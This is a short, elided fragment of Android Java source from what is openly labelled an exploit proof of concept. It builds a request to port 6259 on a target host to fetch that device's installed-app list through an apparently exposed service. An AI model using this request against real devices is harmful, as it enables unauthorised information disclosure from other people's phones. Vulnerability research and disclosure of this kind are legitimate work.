 ...
 * Created by heeeeen on 15/5/21.
 */
public class GetApplist extends ActionBarActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        setTitle("expl0it > "+ target + " > App List");
        mRequestUrl = "http://" + target + ":6259/getapplist?" + "callback=&mcmdf=inapp_";
        mResultView = (TextView) findViewById(R.id.applist);
